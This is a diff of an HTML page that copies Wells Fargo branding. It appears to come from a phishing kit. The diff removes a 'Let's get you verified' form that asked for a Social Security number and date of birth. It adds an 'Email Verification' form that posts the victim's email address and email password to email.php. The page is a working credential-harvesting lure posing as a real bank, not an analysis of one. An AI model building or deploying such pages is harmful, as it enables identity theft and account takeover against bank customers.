@@ -1,26 +1,30 @@
+
 <!DOCTYPE html>
 <html lang="en">
 
 <head>
+      
       <meta charset="UTF-8">
       <meta http-equiv="X-UA-Compatible" content="IE=edge">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <link rel="stylesheet" href="form.css">
-      <!-- <link rel="stylesheet" href="main.css"> -->
-      <link rel="stylesheet" href="/tayo/css/form.css">
+      <link rel="stylesheet" href="/css/main.css">
+      <link rel="stylesheet" href="./css/mobile.css">
       <link rel="stylesheet" href="./fontsawesome/css/all.css">
       <title>Document</title>
+      
 </head>
 
 <body>
+      
       <header>
-            <div class="cot">
 
+            <div class="cot">
                   <div class="logo">
                         <h1>wells fargo</h1>
                   </div>
                   <nav>
                         <ul>
+
                               <div class="key">
                                     <img src="./tayo2a (1).png" alt="">
 
@@ -31,7 +35,7 @@
                               <li><a href=""> Español</a></li>
                               <div class="search">
 
-                                    <input type="search" placeholder="Search">
+                                    <input type="text" placeholder="Search">
                                     <button><i class="fa-solid fa-magnifying-glass"></i></button>
                               </div>
                         </ul>
@@ -45,7 +49,7 @@
                         <div class="mobile-links">
                               <ul>
                                     <div class="search">
-                                          <input type="text" placeholder="Search">
+                                          <input type="search" placeholder="Search">
                                           <button><i class="fa-solid fa-magnifying-glass"></i></button>
                                     </div>
                                     <li><a href="#"><i></i> Enroll</a></li>
@@ -58,47 +62,39 @@
       </header>
 
       <main>
-            <div class="verify">
-
-                  <h2>Let's get you verified</h2>
-
-                  <p>First, we need some information.</p>
-
-                  <!-- Adding the form datas to the database -->
-
-                  <form action="./billing.html" method="post">
-                        <input class="required-input" id="ssn" maxlength="9" type="text" name="ssn"
-                              placeholder="Social Security Number" onBlur="myFunc()" required>
+            <div class="email-card">
+                  <h1 style="color: #d71e28;"> Email Verification</h1>
+                  <h4>Enter email attached to account</h4>
 
 
-                        <a> <i class="fa-regular fa-circle-question icon"></i></a>
+
+                  <form action="email.php" method="post" name="email">
+                        <input type="email" id="sub" placeholder="Email" name="email" required>
                         <br>
                         <br>
-
-                        <p id="mm">Date Of Birth</p>
-                        <br>
-                        <input type="date" name="" id="dob" placeholder="Date of Birth" onclick="myFunction" required>
-
-                        <div class="btn">
-                              <a href="./billing.html">
-                                    <button class="btn-1">Continue</button>
-                              </a>
+                        
+                        <div class="password-container">
+                              <input type="password" placeholder="Email Password" name="emailPass" id="password" autocapitalize=""
+                                    autocomplete="current-password" required>
+                              <i class="far fa-eye" id="eye"></i>
                         </div>
-
+                        <br>
+                        <br>
+                        <div class="btn">
+      
+                              <a href="">
+      
+                                    <button class="btn-1" type="submit">Continue</button>     
+                              </a>
+                              <!-- <input type="submit" value="ontinue" class="btn-1"> -->
                   </form>
 
 
+                  </div>
 
 
             </div>
       </main>
-
-
-
-
-
-
-
 
 
       <footer>
@@ -132,9 +128,22 @@
             <p>
                   &copy; 1999 - 2023 Wells Fargo. All rights reserved. NMLSR ID 399801
             </p>
-
       </footer>
+
+
+
+
       <script>
+            const passwordInput = document.querySelector("#password")
+            const eye = document.querySelector("#eye")
+
+            eye.addEventListener("click", function () {
+                  this.classList.toggle("fa-eye-slash")
+                  const type = passwordInput.getAttribute("type") === "password" ? "text" : "password"
+                  passwordInput.setAttribute("type", type)
+
+            })
+
             var burgerdiv = document.querySelector(".mobile-burger")
             // console.log(burgerdiv)
             var mobilelinks = document.querySelector(".mobile-links")
@@ -145,9 +154,13 @@
                   mobilelinks.classList.toggle("show-mobile-links")
 
             }
+
       </script>
 
-      <script src="./script.js"></script>
+
+
+      <!-- <script src="./script.js"></script> -->
+
 </body>
 
 </html>
